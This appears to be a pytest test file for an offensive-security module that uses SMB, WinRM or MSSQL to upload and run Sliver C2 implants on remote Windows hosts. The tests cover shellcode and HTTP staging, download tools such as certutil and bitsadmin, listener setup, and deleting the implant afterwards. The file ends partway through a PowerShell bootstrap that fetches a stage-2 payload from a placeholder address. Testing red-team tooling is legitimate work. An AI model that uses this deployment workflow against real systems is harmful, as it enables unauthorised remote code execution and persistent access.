        mock_resp = Mock()
        mock_resp.File = Mock()
        mock_resp.File.Data = b"okbytes"

        # submit_task should handle connect and generate_implant
        calls = {"jobs": 0}
        listener = Mock()
        listener.Protocol = "tcp"
        listener.Port = 443
        listener.Name = "mtls"

        def side_effect(method, *args, **kwargs):
            if method == "connect":
                return None
            if method == "jobs":
                calls["jobs"] += 1
                # First jobs call: no listeners; second call: return the listener created
                return [] if calls["jobs"] == 1 else [listener]
            if method == "generate_implant":
                return mock_resp
            if method == "implant_profiles":
                return []
            return None

        patch_get_worker.submit_task.side_effect = side_effect

        module_instance.config_path = mock_config_file
        module_instance.format = "EXECUTABLE"
        module_instance.profile = None

        data = module_instance._generate_sliver_implant(mock_context, "windows", "amd64", "test.exe")
        assert data == b"okbytes"

    def test_run_beacon_end_to_end_mocked(
        self, patch_get_worker, module_instance, mock_context, mock_connection, tmp_path
    ):
        """End-to-end run beacon flow with SMB upload/execute mocked to avoid sys.exit."""
        mock_worker = patch_get_worker

        # Mock the shared GrpcWorker
        mock_jobs_existing = [Mock(Protocol="tcp", Port=443, Name="mtls")]  # Existing listener
        mock_profiles = []  # No existing profiles
        mock_resp = Mock()
        mock_resp.File.Data = b"implant_bytes"

        # Mock listener response with JobID
        mock_listener_resp = Mock()
        mock_listener_resp.JobID = 1

        call_count = 0

        def side_effect(method, *args, **kwargs):
            nonlocal call_count
            call_count += 1
            if method == "connect":
                return None
            elif method == "jobs":
                return mock_jobs_existing
            elif method == "implant_profiles":
                return mock_profiles
            elif method == "generate_implant":
                return mock_resp
            elif method == "start_http_listener_with_website":
                return mock_listener_resp
            elif method == "beacons":
                return []
            elif method == "sessions":
                return []
            return None

        mock_worker.submit_task.side_effect = side_effect

        # Create a temp file for the implant
        import tempfile

        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=".exe")
        temp_file.write(b"implantdata")
        temp_file.close()
        local_implant_path = temp_file.name

        # Patch methods to avoid network or file-system dependencies
        module_instance._detect_os_arch = Mock(return_value=("windows", "amd64"))
        module_instance._build_ic_default = Mock(return_value=(Mock(), "default_profile"))
        module_instance._generate_sliver_implant = Mock(return_value=b"implantdata")
        module_instance._save_implant_to_temp = Mock(return_value=local_implant_path)
        module_instance._wait_for_beacon_and_cleanup = Mock()
        module_instance._cleanup_local_temp = Mock()

        # Use a connection with host and protocol attributes
        conn = mock_connection
        conn.host = "10.0.0.1"
        conn.protocol = "smb"
        # Mock the class name for protocol detection
        conn.__class__.__name__ = "smb"
        # Mock SMB connection methods
        conn.conn = Mock()
        conn.conn.reconnect = Mock()
        conn.conn.putFile = Mock()
        conn.execute = Mock()

        module_instance.cleanup_mode = "never"
        module_instance.format = "EXECUTABLE"
        module_instance.extension = "exe"
        module_instance.staging_mode = "none"  # Disable auto-staging for SMB

        try:
            # Run - should not raise
            module_instance._run_beacon(mock_context, conn)

            # Assert: OS/arch detection was called
            module_instance._detect_os_arch.assert_called_once_with(mock_context, conn)

            # Assert: Implant generation was called with detected OS/arch
            module_instance._generate_sliver_implant.assert_called_once()
            gen_args = module_instance._generate_sliver_implant.call_args
            assert gen_args is not None, "generate_sliver_implant should have been called"

            # Assert: Implant saved to temp location
            module_instance._save_implant_to_temp.assert_called_once_with(b"implantdata")

            # Assert: SMB handler upload was called
            conn.conn.putFile.assert_called_once()

            # Assert: SMB handler execute was called
            conn.execute.assert_called_once()

            # Assert: Wait and cleanup was called with correct cleanup mode
            module_instance._wait_for_beacon_and_cleanup.assert_called_once()
            cleanup_args = module_instance._wait_for_beacon_and_cleanup.call_args
            assert cleanup_args.kwargs["cleanup_mode"] == "never"
        finally:
            # Cleanup temp file
            import os

            os.unlink(local_implant_path)

    def test_run_beacon_staging_winrm_mocked(
        self, patch_get_worker, module_instance, mock_context, mock_connection, tmp_path
    ):
        """Test staging mode with WinRM protocol."""
        mock_worker = patch_get_worker

        # Mock the shared GrpcWorker for shellcode generation
        mock_gen_resp = Mock()
        mock_gen_resp.File = Mock()
        mock_gen_resp.File.Data = b"shellcode_bytes"

        call_count = 0

        def side_effect(method, *args, **kwargs):
            nonlocal call_count
            call_count += 1
            if method == "connect":
                return None
            elif method == "beacons":
                return []
            elif method == "sessions":
                return []
            return None

        mock_worker.submit_task.side_effect = side_effect

        # Mock the Generate RPC call
        mock_worker._stub.Generate.return_value = mock_gen_resp

        # Patch methods to avoid network dependencies
        module_instance._detect_os_arch = Mock(return_value=("windows", "amd64"))
        module_instance._build_ic_default = Mock(return_value=(Mock(), "test_profile"))
        module_instance._generate_sliver_stager = Mock(return_value=b"stagerdata")
        module_instance._wait_for_beacon_and_cleanup = Mock()

        # Use a WinRM connection
        conn = mock_connection
        conn.host = "10.0.0.1"
        conn.protocol = "winrm"
        conn.__class__.__name__ = "winrm"
        conn.ps_execute = Mock(return_value="Command completed")  # Mock successful PowerShell execution

        # Enable staging
        module_instance.staging_mode = "shellcode"
        module_instance.shellcode_listener_host = "192.168.1.100"
        module_instance.shellcode_listener_port = 8080
        module_instance.shellcode_protocol = "http"
        module_instance.rhost = "192.168.1.100"
        module_instance.rport = 443
        module_instance.cleanup_mode = "never"
        module_instance.format = "EXECUTABLE"
        module_instance.extension = "exe"

        # Run - should not raise
        module_instance._run_beacon(mock_context, conn)

        # Verify staging-specific calls were made
        mock_context.log.info.assert_any_call("Started HTTP stager listener on 192.168.1.100:8080")
        mock_context.log.info.assert_any_call("Started mTLS C2 listener for stage 2 on 192.168.1.100:443")
        mock_context.log.info.assert_any_call("Stager executed on 10.0.0.1 via winrm (multi-stage HTTP)")

    def test_run_beacon_staging_mode_download(
        self, patch_get_worker, module_instance, mock_context, mock_connection, tmp_path
    ):
        mock_worker = patch_get_worker

        mock_gen_resp = Mock()
        mock_gen_resp.File = Mock()
        mock_gen_resp.File.Data = b"implant_bytes"
        mock_listener_resp = Mock()
        mock_listener_resp.JobID = 1

        call_count = 0

        def side_effect(method, *args, **kwargs):
            nonlocal call_count
            call_count += 1
            if method == "connect":
                return None
            elif method == "generate_implant":
                return mock_gen_resp
            elif method == "start_http_listener_with_website":
                return mock_listener_resp
            elif method == "beacons":
                return []
            elif method == "sessions":
                return []
            return None

        mock_worker.submit_task.side_effect = side_effect

        module_instance._detect_os_arch = Mock(return_value=("windows", "amd64"))
        module_instance._generate_implant_name = Mock(return_value="test_implant.exe")
        module_instance._generate_sliver_implant = Mock(return_value=b"implantdata")
        module_instance._run_beacon_staged_http = Mock(return_value=(None, 1, "test_site"))
        module_instance._wait_for_beacon_and_cleanup = Mock()

        conn = mock_connection
        conn.host = "10.0.0.1"
        conn.__class__.__name__ = "winrm"
        conn.ps_execute = Mock(return_value="Command completed")

        module_instance.staging_mode = "download"
        module_instance.http_staging_port = 8080
        module_instance.download_tool = "powershell"
        module_instance.rhost = "192.168.1.100"
        module_instance.rport = 443
        module_instance.cleanup_mode = "never"
        module_instance.format = "EXECUTABLE"
        module_instance.extension = "exe"

        module_instance._run_beacon(mock_context, conn)

        module_instance._run_beacon_staged_http.assert_called_once()
        module_instance._wait_for_beacon_and_cleanup.assert_called_once()
        wait_call_args = module_instance._wait_for_beacon_and_cleanup.call_args
        assert wait_call_args.kwargs["listener_job_id"] == 1
        assert wait_call_args.kwargs["website_name"] == "test_site"

    def test_run_beacon_staging_mode_shellcode(self, patch_get_worker, module_instance, mock_context, mock_connection):
        mock_worker = patch_get_worker

        mock_gen_resp = Mock()
        mock_gen_resp.File = Mock()
        mock_gen_resp.File.Data = b"shellcode_bytes"

        call_count = 0

        def side_effect(method, *args, **kwargs):
            nonlocal call_count
            call_count += 1
            if method == "connect":
                return None
            elif method == "beacons":
                return []
            elif method == "sessions":
                return []
            return None

        mock_worker.submit_task.side_effect = side_effect
        mock_worker._stub.Generate.return_value = mock_gen_resp

        module_instance._detect_os_arch = Mock(return_value=("windows", "amd64"))
        module_instance._build_ic_default = Mock(return_value=(Mock(), "test_profile"))
        module_instance._generate_sliver_stager = Mock(return_value=b"stagerdata")
        module_instance._wait_for_beacon_and_cleanup = Mock()

        conn = mock_connection
        conn.host = "10.0.0.1"
        conn.__class__.__name__ = "winrm"
        conn.ps_execute = Mock(return_value="Command completed")

        module_instance.staging_mode = "shellcode"
        module_instance.shellcode_listener_host = "192.168.1.100"
        module_instance.shellcode_listener_port = 8080
        module_instance.shellcode_protocol = "http"
        module_instance.rhost = "192.168.1.100"
        module_instance.rport = 443
        module_instance.cleanup_mode = "never"
        module_instance.format = "EXECUTABLE"
        module_instance.extension = "exe"

        module_instance._run_beacon(mock_context, conn)

        module_instance._generate_sliver_stager.assert_called_once()
        module_instance._wait_for_beacon_and_cleanup.assert_called_once()

    def test_run_beacon_auto_mssql_staging(self, patch_get_worker, module_instance, mock_context, mock_connection):
        mock_worker = patch_get_worker

        mock_gen_resp = Mock()
        mock_gen_resp.File = Mock()
        mock_gen_resp.File.Data = b"implant_bytes"
        mock_listener_resp = Mock()
        mock_listener_resp.JobID = 1

        call_count = 0

        def side_effect(method, *args, **kwargs):
            nonlocal call_count
            call_count += 1
            if method == "connect":
                return None
            elif method == "generate_implant":
                return mock_gen_resp
            elif method == "start_http_listener_with_website":
                return mock_listener_resp
            elif method == "beacons":
                return []
            elif method == "sessions":
                return []
            return None

        mock_worker.submit_task.side_effect = side_effect

        module_instance._detect_os_arch = Mock(return_value=("windows", "amd64"))
        module_instance._generate_implant_name = Mock(return_value="test_implant.exe")
        module_instance._generate_sliver_implant = Mock(return_value=b"implantdata")
        module_instance._run_beacon_staged_http = Mock(return_value=(None, 1, "test_site"))
        module_instance._wait_for_beacon_and_cleanup = Mock()

        conn = mock_connection
        conn.host = "10.0.0.1"
        conn.__class__.__name__ = "mssql"

        module_instance.staging_mode = None
        module_instance.http_staging_port = None
        module_instance.download_tool = None
        module_instance.rhost = "192.168.1.100"
        module_instance.rport = 443
        module_instance.cleanup_mode = "never"
        module_instance.format = "EXECUTABLE"
        module_instance.extension = "exe"

        module_instance._run_beacon(mock_context, conn)

        assert module_instance.staging_mode == "download"
        assert module_instance.http_staging_port == 8080
        assert module_instance.download_tool == "certutil"
        module_instance._run_beacon_staged_http.assert_called_once()

    def test_run_beacon_auto_smb_staging(self, patch_get_worker, module_instance, mock_context, mock_connection):
        mock_worker = patch_get_worker

        mock_gen_resp = Mock()
        mock_gen_resp.File = Mock()
        mock_gen_resp.File.Data = b"implant_bytes"
        mock_listener_resp = Mock()
        mock_listener_resp.JobID = 1

        call_count = 0

        def side_effect(method, *args, **kwargs):
            nonlocal call_count
            call_count += 1
            if method == "connect":
                return None
            elif method == "generate_implant":
                return mock_gen_resp
            elif method == "start_http_listener_with_website":
                return mock_listener_resp
            elif method == "beacons":
                return []
            elif method == "sessions":
                return []
            return None

        mock_worker.submit_task.side_effect = side_effect

        module_instance._detect_os_arch = Mock(return_value=("windows", "amd64"))
        module_instance._generate_implant_name = Mock(return_value="test_implant.exe")
        module_instance._generate_sliver_implant = Mock(return_value=b"implantdata")
        module_instance._run_beacon_staged_http = Mock(return_value=(None, 1, "test_site"))
        module_instance._wait_for_beacon_and_cleanup = Mock()

        conn = mock_connection
        conn.host = "10.0.0.1"
        conn.__class__.__name__ = "smb"

        module_instance.staging_mode = None
        module_instance.http_staging_port = None
        module_instance.download_tool = None
        module_instance.rhost = "192.168.1.100"
        module_instance.rport = 443
        module_instance.cleanup_mode = "never"
        module_instance.format = "EXECUTABLE"
        module_instance.extension = "exe"

        module_instance._run_beacon(mock_context, conn)

        assert module_instance.staging_mode == "download"
        assert module_instance.http_staging_port == 8080
        assert module_instance.download_tool == "powershell"
        module_instance._run_beacon_staged_http.assert_called_once()

    def test_method_signatures(self, module_instance):
        """
        Test that method signatures match expected parameter counts.
        This helps catch issues where method calls pass incorrect number of arguments.
        """
        # Check key method signatures to ensure they match their call sites
        expected_signatures = {
            "_wait_for_beacon": 3,  # context, implant_name, timeout=30
            "_run_beacon": 2,  # context, connection
            "_detect_os_arch": 2,  # context, connection
            "_generate_implant_name": 0,  # no parameters
        }

        for method_name, expected_params in expected_signatures.items():
            method = getattr(module_instance, method_name)
            sig = inspect.signature(method)
            actual_params = len(sig.parameters)
            assert actual_params == expected_params, (
                f"Method {method_name} has {actual_params} parameters, expected {expected_params}. Signature: {sig}"
            )

    @pytest.mark.asyncio
    async def test_grpc_worker_start_stager_listener_tcp(self):
        """Test StartStagerListener RPC with TCP protocol (Sliver 1.5.44 API)."""
        from nxc.modules.sliver_exec import GrpcWorker

        worker = GrpcWorker()
        worker.config_path = "/fake/config.cfg"

        mock_client = Mock()
        mock_stub = Mock()
        mock_client.raw_stub = mock_stub

        mock_req = Mock()
        mock_resp = Mock()
        mock_resp.Job = 1

        async def mock_rpc(*args, **kwargs):
            return mock_resp

        mock_stub.StartTCPStagerListener = mock_rpc

        with patch.object(worker, "_do_connect", new=AsyncMock(return_value=mock_client)):
            with patch("nxc.modules.sliver_exec.clientpb") as mock_clientpb:
                mock_clientpb.StagerListenerReq = Mock(return_value=mock_req)
                mock_clientpb.StageProtocol = Mock(TCP=0)

                result = await worker._do_start_stager_listener(
                    "127.0.0.1", 8080, "tcp", profile_name="test_profile", stage_data=b"stage_payload"
                )

                assert result == mock_resp.JobID
                assert mock_req.Protocol == 0

    @pytest.mark.asyncio
    async def test_grpc_worker_start_stager_listener_http(self):
        """Test StartStagerListener RPC with HTTP protocol (Sliver 1.5.44 API)."""
        from nxc.modules.sliver_exec import GrpcWorker

        worker = GrpcWorker()
        worker.config_path = "/fake/config.cfg"

        mock_client = Mock()
        mock_stub = Mock()
        mock_client.raw_stub = mock_stub

        mock_req = Mock()
        mock_resp = Mock()
        mock_resp.JobID = 2

        async def mock_rpc(*args, **kwargs):
            return mock_resp

        mock_stub.StartHTTPListener = mock_rpc

        with patch.object(worker, "_do_connect", new=AsyncMock(return_value=mock_client)):
            with patch("nxc.modules.sliver_exec.clientpb") as mock_clientpb:
                mock_clientpb.HTTPListenerReq = Mock(return_value=mock_req)

                result = await worker._do_start_stager_listener("127.0.0.1", 8080, "http")

                assert result == mock_resp.JobID

    @pytest.mark.asyncio
    async def test_grpc_worker_start_stager_listener_https(self):
        """Test StartStagerListener RPC with HTTPS protocol (Sliver 1.5.44 API)."""
        from nxc.modules.sliver_exec import GrpcWorker

        worker = GrpcWorker()
        worker.config_path = "/fake/config.cfg"

        mock_client = Mock()
        mock_stub = Mock()
        mock_client.raw_stub = mock_stub

        mock_req = Mock()
        mock_resp = Mock()
        mock_resp.JobID = 3

        async def mock_rpc(*args, **kwargs):
            return mock_resp

        mock_stub.StartHTTPSListener = mock_rpc

        with patch.object(worker, "_do_connect", new=AsyncMock(return_value=mock_client)):
            with patch("nxc.modules.sliver_exec.clientpb") as mock_clientpb:
                mock_clientpb.HTTPListenerReq = Mock(return_value=mock_req)

                result = await worker._do_start_stager_listener("127.0.0.1", 8080, "https")

                assert result == mock_resp.JobID

    @pytest.mark.asyncio
    async def test_grpc_worker_start_stager_listener_invalid_protocol(self):
        """Test StartStagerListener RPC with invalid protocol raises ValueError."""
        from nxc.modules.sliver_exec import GrpcWorker

        worker = GrpcWorker()
        worker.config_path = "/fake/config.cfg"

        mock_client = Mock()

        with patch.object(worker, "_do_connect", new=AsyncMock(return_value=mock_client)):
            with patch("nxc.modules.sliver_exec.clientpb"):
                with pytest.raises(ValueError, match="Unsupported SHELLCODE_PROTOCOL"):
                    await worker._do_start_stager_listener("127.0.0.1", 8080, "invalid")

    @pytest.mark.asyncio
    async def test_grpc_worker_start_tcp_stager_listener_uses_start_stager_listener(self):
        """Test _do_start_tcp_stager_listener uses StartTCPStagerListener RPC."""
        from nxc.modules.sliver_exec import GrpcWorker

        worker = GrpcWorker()
        worker.config_path = "/fake/config.cfg"

        mock_client = Mock()
        mock_stub = Mock()
        mock_client.raw_stub = mock_stub

        mock_req = Mock()
        mock_resp = Mock()

        async def mock_rpc(*args, **kwargs):
            return mock_resp

        mock_stub.StartTCPStagerListener = mock_rpc

        with patch.object(worker, "_do_connect", new=AsyncMock(return_value=mock_client)):
            with patch("nxc.modules.sliver_exec.clientpb") as mock_clientpb:
                mock_clientpb.StagerListenerReq = Mock(return_value=mock_req)
                mock_clientpb.StageProtocol = Mock(TCP=0)

                result = await worker._do_start_tcp_stager_listener("127.0.0.1", 8080)

                assert result == mock_resp
                assert hasattr(mock_stub, "StartTCPStagerListener")

    # === HTTP Staging Tests ===

    def test_options_invalid_stager_port(self, mock_context, mock_module_options):
        """Test invalid HTTP_STAGING_PORT validation."""
        mock_module_options["STAGING"] = "download"
        mock_module_options["HTTP_STAGING_PORT"] = "99999"
        module = NXCModule()
        with pytest.raises(ModuleValidationError):
            module.options(mock_context, mock_module_options)
        # Check first call (error message with examples is multi-line)
        assert mock_context.log.fail.call_count >= 1
        assert (
            mock_context.log.fail.call_args_list[0][0][0]
            == "HTTP_STAGING_PORT must be a valid port number (1-65535): 99999"
        )

    def test_options_invalid_stager_port_non_numeric(self, mock_context, mock_module_options):
        """Test non-numeric HTTP_STAGING_PORT validation."""
        mock_module_options["STAGING"] = "download"
        mock_module_options["HTTP_STAGING_PORT"] = "not-a-number"
        module = NXCModule()
        with pytest.raises(ModuleValidationError):
            module.options(mock_context, mock_module_options)
        # Check first call (error message with examples is multi-line)
        assert mock_context.log.fail.call_count >= 1
        assert (
            mock_context.log.fail.call_args_list[0][0][0]
            == "HTTP_STAGING_PORT must be a valid port number (1-65535): not-a-number"
        )

    def test_options_invalid_staging_method(self, mock_context, mock_module_options):
        """Test invalid DOWNLOAD_TOOL validation."""
        mock_module_options["STAGING"] = "download"
        mock_module_options["DOWNLOAD_TOOL"] = "invalid"
        module = NXCModule()
        with pytest.raises(ModuleValidationError):
            module.options(mock_context, mock_module_options)
        # Check first call (error message with examples is multi-line)
        assert mock_context.log.fail.call_count >= 1
        assert (
            mock_context.log.fail.call_args_list[0][0][0]
            == "DOWNLOAD_TOOL must be one of: powershell, certutil, bitsadmin, wget, curl, python (default: powershell)"
        )

    def test_options_valid_with_http_staging(
        self, mock_context, mock_module_options, module_instance, mock_config_file
    ):
        """Test valid options with HTTP staging enabled."""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["STAGING"] = "download"
        mock_module_options["HTTP_STAGING_PORT"] = "8080"
        mock_module_options["DOWNLOAD_TOOL"] = "powershell"
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.staging_mode == "download"
        assert module_instance.http_staging_port == 8080
        assert module_instance.download_tool == "powershell"

    def test_options_http_staging_certutil(self, mock_context, mock_module_options, module_instance, mock_config_file):
        """Test HTTP staging with certutil method."""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["STAGING"] = "download"
        mock_module_options["HTTP_STAGING_PORT"] = "8080"
        mock_module_options["DOWNLOAD_TOOL"] = "certutil"
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.download_tool == "certutil"

    def test_options_http_staging_bitsadmin(self, mock_context, mock_module_options, module_instance, mock_config_file):
        """Test HTTP staging with bitsadmin method."""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["STAGING"] = "download"
        mock_module_options["HTTP_STAGING_PORT"] = "8080"
        mock_module_options["DOWNLOAD_TOOL"] = "bitsadmin"
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.download_tool == "bitsadmin"

    def test_options_http_staging_wget(self, mock_context, mock_module_options, module_instance, mock_config_file):
        """Test HTTP staging with wget method (Linux)."""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["STAGING"] = "download"
        mock_module_options["HTTP_STAGING_PORT"] = "8080"
        mock_module_options["DOWNLOAD_TOOL"] = "wget"
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.download_tool == "wget"

    def test_options_http_staging_curl(self, mock_context, mock_module_options, module_instance, mock_config_file):
        """Test HTTP staging with curl method (Linux)."""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["STAGING"] = "download"
        mock_module_options["HTTP_STAGING_PORT"] = "8080"
        mock_module_options["DOWNLOAD_TOOL"] = "curl"
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.download_tool == "curl"

    def test_options_http_staging_python(self, mock_context, mock_module_options, module_instance, mock_config_file):
        """Test HTTP staging with python method (Linux)."""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["STAGING"] = "download"
        mock_module_options["HTTP_STAGING_PORT"] = "8080"
        mock_module_options["DOWNLOAD_TOOL"] = "python"
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.download_tool == "python"

    @pytest.mark.asyncio
    async def test_grpc_worker_website_add_content(self):
        """Test _do_website_add_content worker method."""
        from nxc.modules.sliver_exec import GrpcWorker

        worker = GrpcWorker()
        worker.config_path = "/fake/config.cfg"

        # Mock the client and protobuf
        mock_client = Mock()
        mock_stub = Mock()
        mock_client._stub = mock_stub

        mock_resp = Mock()

        async def mock_rpc(*args, **kwargs):
            return mock_resp

        mock_stub.WebsiteAddContent = mock_rpc

        with patch.object(worker, "_do_connect", new=AsyncMock(return_value=mock_client)):
            with patch("nxc.modules.sliver_exec.clientpb") as mock_clientpb:
                mock_content = Mock()
                mock_content_dict_entry = Mock()

                contents_dict = MagicMock()
                contents_dict.__getitem__ = Mock(return_value=mock_content_dict_entry)

                mock_req = Mock()
                mock_req.Contents = contents_dict

                mock_clientpb.WebContent = Mock(return_value=mock_content)
                mock_clientpb.WebsiteAddContent = Mock(return_value=mock_req)

                result = await worker._do_website_add_content(
                    "test_website", "/implant.exe", "application/octet-stream", b"implant_data"
                )

                assert result == mock_resp
                assert mock_content.Path == "/implant.exe"
                assert mock_content.ContentType == "application/octet-stream"
                assert mock_content.Content == b"implant_data"
                mock_content_dict_entry.CopyFrom.assert_called_once_with(mock_content)

    @pytest.mark.asyncio
    async def test_grpc_worker_website_remove(self):
        """Test _do_website_remove worker method."""
        from nxc.modules.sliver_exec import GrpcWorker

        worker = GrpcWorker()
        worker.config_path = "/fake/config.cfg"

        # Mock the client
        mock_client = Mock()
        mock_stub = Mock()
        mock_client._stub = mock_stub

        mock_resp = Mock()

        async def mock_rpc(*args, **kwargs):
            return mock_resp

        mock_stub.WebsiteRemove = mock_rpc

        with patch.object(worker, "_do_connect", new=AsyncMock(return_value=mock_client)):
            with patch("nxc.modules.sliver_exec.clientpb") as mock_clientpb:
                mock_website_req = Mock()
                mock_clientpb.Website = Mock(return_value=mock_website_req)

                result = await worker._do_website_remove("test_website")

                assert result == mock_resp
                assert mock_website_req.Name == "test_website"

    @pytest.mark.asyncio
    async def test_grpc_worker_start_http_listener_with_website(self):
        """Test _do_start_http_listener_with_website worker method."""
        from nxc.modules.sliver_exec import GrpcWorker

        worker = GrpcWorker()
        worker.config_path = "/fake/config.cfg"

        # Mock the client
        mock_client = Mock()
        mock_stub = Mock()
        mock_client._stub = mock_stub

        mock_resp = Mock()
        mock_resp.JobID = 123

        async def mock_rpc(*args, **kwargs):
            return mock_resp

        mock_stub.StartHTTPListener = mock_rpc

        with patch.object(worker, "_do_connect", new=AsyncMock(return_value=mock_client)):
            with patch("nxc.modules.sliver_exec.clientpb") as mock_clientpb:
                mock_req = Mock()
                mock_clientpb.HTTPListenerReq = Mock(return_value=mock_req)

                result = await worker._do_start_http_listener_with_website(
                    "0.0.0.0", 8080, "test_website", secure=False
                )

                assert result == mock_resp
                assert mock_req.Host == "0.0.0.0"
                assert mock_req.Port == 8080
                assert mock_req.Website == "test_website"
                assert not mock_req.Secure

    @pytest.mark.asyncio
    async def test_grpc_worker_start_https_listener_with_website(self):
        """Test _do_start_http_listener_with_website with HTTPS."""
        from nxc.modules.sliver_exec import GrpcWorker

        worker = GrpcWorker()
        worker.config_path = "/fake/config.cfg"

        # Mock the client
        mock_client = Mock()
        mock_stub = Mock()
        mock_client._stub = mock_stub

        mock_resp = Mock()
        mock_resp.JobID = 456

        async def mock_rpc(*args, **kwargs):
            return mock_resp

        mock_stub.StartHTTPSListener = mock_rpc

        with patch.object(worker, "_do_connect", new=AsyncMock(return_value=mock_client)):
            with patch("nxc.modules.sliver_exec.clientpb") as mock_clientpb:
                mock_req = Mock()
                mock_clientpb.HTTPListenerReq = Mock(return_value=mock_req)

                result = await worker._do_start_http_listener_with_website("0.0.0.0", 8443, "test_website", secure=True)

                assert result == mock_resp
                assert mock_req.Secure

    @pytest.mark.asyncio
    async def test_grpc_worker_kill_job(self):
        """Test _do_kill_job worker method."""
        from nxc.modules.sliver_exec import GrpcWorker

        worker = GrpcWorker()
        worker.config_path = "/fake/config.cfg"

        # Mock the client
        mock_client = Mock()
        mock_stub = Mock()
        mock_client._stub = mock_stub

        mock_resp = Mock()

        async def mock_rpc(*args, **kwargs):
            return mock_resp

        mock_stub.KillJob = mock_rpc

        with patch.object(worker, "_do_connect", new=AsyncMock(return_value=mock_client)):
            with patch("nxc.modules.sliver_exec.clientpb") as mock_clientpb:
                mock_kill_req = Mock()
                mock_clientpb.KillJobReq = Mock(return_value=mock_kill_req)

                result = await worker._do_kill_job(123)

                assert result == mock_resp
                assert mock_kill_req.ID == 123

    def test_run_beacon_http_staging_route(self, patch_get_worker, module_instance, mock_context, mock_connection):
        """Test that _run_beacon routes to HTTP staging when HTTP_STAGING_PORT is set."""

        # Mock methods
        module_instance._detect_os_arch = Mock(return_value=("windows", "amd64"))
        module_instance._run_beacon_staged_http = Mock(return_value=(None, 123, "website_abc"))
        module_instance._wait_for_beacon_and_cleanup = Mock()
        module_instance._cleanup_local_temp = Mock()

        # Use WinRM connection
        conn = mock_connection
        conn.host = "10.0.0.1"
        conn.__class__.__name__ = "winrm"

        # Enable HTTP staging
        module_instance.staging_mode = "download"
        module_instance.http_staging_port = 8080
        module_instance.download_tool = "powershell"
        module_instance.cleanup_mode = "always"
        module_instance.format = "EXECUTABLE"
        module_instance.extension = "exe"

        # Run
        module_instance._run_beacon(mock_context, conn)

        # Verify HTTP staging was called
        module_instance._run_beacon_staged_http.assert_called_once()
        # Verify cleanup was called with HTTP staging parameters
        module_instance._wait_for_beacon_and_cleanup.assert_called_once()
        call_args = module_instance._wait_for_beacon_and_cleanup.call_args
        assert call_args[1]["listener_job_id"] == 123
        assert call_args[1]["website_name"] == "website_abc"

    def test_wait_for_beacon_and_cleanup_with_http_staging(
        self, patch_get_worker, module_instance, mock_context, mock_connection
    ):
        """Test _wait_for_beacon_and_cleanup handles HTTP staging cleanup."""
        mock_worker = patch_get_worker

        # Mock beacon polling
        mock_worker.submit_task.side_effect = lambda method, *a, **k: (
            [] if method in ["beacons", "sessions"] else None if method in ["kill_job", "website_remove"] else None
        )

        # Mock handler
        mock_handler = Mock()
        mock_handler.get_cleanup_cmd = Mock(return_value="del /f /q C:\\temp\\implant.exe")

        # Setup module
        module_instance.config_path = "/fake/config.cfg"
        module_instance.wait_seconds = 1  # Short timeout for test

        conn = mock_connection
        conn.__class__.__name__ = "winrm"
        conn.ps_execute = Mock(return_value="")

        # Call with HTTP staging cleanup parameters
        module_instance._wait_for_beacon_and_cleanup(
            mock_context,
            conn,
            "C:\\temp\\implant.exe",
            "windows",
            "implant_test",
            mock_handler,
            "winrm",
            cleanup_mode="always",
            listener_job_id=123,
            website_name="website_abc",
        )

        # Verify HTTP staging cleanup was called
        mock_worker.submit_task.assert_any_call("kill_job", 123)
        mock_worker.submit_task.assert_any_call("website_remove", "website_abc")
        # Verify file cleanup was also called
        conn.ps_execute.assert_called_once()

    def test_options_staging_new_syntax_http(
        self, mock_context, mock_module_options, module_instance, mock_config_file
    ):
        """Test new STAGING=shellcode + SHELLCODE_PROTOCOL=http syntax"""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["STAGING"] = "shellcode"
        mock_module_options["SHELLCODE_PROTOCOL"] = "http"
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.staging_mode == "shellcode"
        assert module_instance.shellcode_protocol == "http"
        mock_context.conf.get.assert_called_once()

    def test_options_staging_new_syntax_tcp(self, mock_context, mock_module_options, module_instance, mock_config_file):
        """Test new STAGING=shellcode + SHELLCODE_PROTOCOL=tcp syntax"""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["STAGING"] = "shellcode"
        mock_module_options["SHELLCODE_PROTOCOL"] = "tcp"
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.staging_mode == "shellcode"
        assert module_instance.shellcode_protocol == "tcp"
        mock_context.conf.get.assert_called_once()

    def test_options_staging_port_new_name(self, mock_context, mock_module_options, module_instance, mock_config_file):
        """Test HTTP_STAGING_PORT option name"""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["STAGING"] = "download"
        mock_module_options["HTTP_STAGING_PORT"] = "9090"
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.staging_mode == "download"
        assert module_instance.http_staging_port == 9090
        mock_context.conf.get.assert_called_once()

    def test_options_download_tool_new_name(self, mock_context, mock_module_options, module_instance, mock_config_file):
        """Test DOWNLOAD_TOOL option name"""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["STAGING"] = "download"
        mock_module_options["DOWNLOAD_TOOL"] = "certutil"
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.staging_mode == "download"
        assert module_instance.download_tool == "certutil"
        mock_context.conf.get.assert_called_once()

    def test_bootstrap_stager_payload_under_150kb_limit(self, module_instance):
        """Test that HTTP bootstrap stager stays under WinRM 150KB envelope limit.

        This test verifies the fileless staging mode fix that replaces the old
        approach of sending 17MB shellcode (which failed) with a tiny 2KB bootstrap
        that downloads the shellcode from the stager listener.
        """
        # Create a realistic bootstrap PowerShell script (similar to what _generate_http_download_bootstrap produces)
        stage_url = "http://10.0.0.1:8080/nxc_stage2_abc123"
        bootstrap_script = f"""
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;
$ProgressPreference = 'SilentlyContinue';
